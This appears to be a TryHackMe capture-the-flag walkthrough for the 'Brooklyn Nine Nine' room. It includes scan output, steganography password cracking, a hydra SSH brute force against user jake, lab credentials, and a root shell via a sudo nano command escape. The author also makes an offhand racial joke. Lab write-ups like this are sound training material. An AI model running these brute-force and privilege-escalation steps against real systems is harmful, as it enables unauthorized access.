---
title: "Brooklin nine nine"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="bnn.jpeg" alt="bnn" style="width: 200px;" >}}

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 718, Words: 94, Lines: 33]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]

```

Haha a comedy classic. ok ftp first

```bash
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
227 Entering Passive Mode (10,10,70,22,232,201)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (1.1822 MB/s)
```

haha `jake` got a weak password. No surprise here! does it mean we can brute his ssh?

hmm..let's check the website first...wide background...lets check code (always)

```html

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
```

{{< post-img src="brooklyn99.jpg" alt="brooklyn99" style="width: 300px;" >}}


steganography is booming now...Do people really use it that much IRL?

```bash
└──╼ $binwalk brooklyn99.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


└──╼ $steghide --info brooklyn99.jpg
"brooklyn99.jpg":
  format: jpeg
  capacit�: 3,5 KB
Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
Entrez la passphrase:
steghide: Impossible de d�compresser les donn�es. Donn�es endommag�es.
```
corrupted data? now what? oh yeah wrong passphrase!

stegcracker it is! well I don't like bruteforce alot

```bash
└──╼ $stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20715 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

time-consuming for probable results...my computer is a potato...oh look it's done!

in the extracted file we get holt-s password lol

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Ok now I get it..the author was talkig about two ways of access

I thought we would be jake but we are holt...

I want to try something real quick (not so quick)


```bash
└──╼ $hydra -l jake -P /usr/share/wordlists/rockyou.txt -s 22 -f 10.10.70.22 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-27 01:18:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.70.22:22/
[22][ssh] host: 10.10.70.22   login: jake   password: 987654321
[STATUS] attack finished for 10.10.70.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-27 01:18:25
```

Lol I knew it! now we have two possible ways of access:

`jake:987654321`

`holt:fluffydog12@ninenine`

I like jake alot but I feel holt would have more "authority"...holt first!

We can always su to jake if the same password is valid

```bash
holt@brookly_nine_nine:~$ cat user.txt
brooklyn_nine_nine_flag
```

## Privilege Escalation

Even holt needs more privileges? what? is it because he is black?

```bash
holt@brookly_nine_nine:/home/amy$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

nano? easy!

like vi or vim nano can execute commands too

as it runs as root (sudo) just ask for a shell and it shall be a root shell

first open nano with root authority

`sudo nano`

Next do ^R (ctrl+R) for reading mode then ^X (ctrl+X) for commands execution

your command for a shell would be:
```
reset; sh 1>&0 2>&0
```
press enter and you are root

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
Now go get that flag!

```bash
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: nine_nine_hacked_flag

Enjoy!!
```
I hope you have fun doing this room...I specifically request it! XD
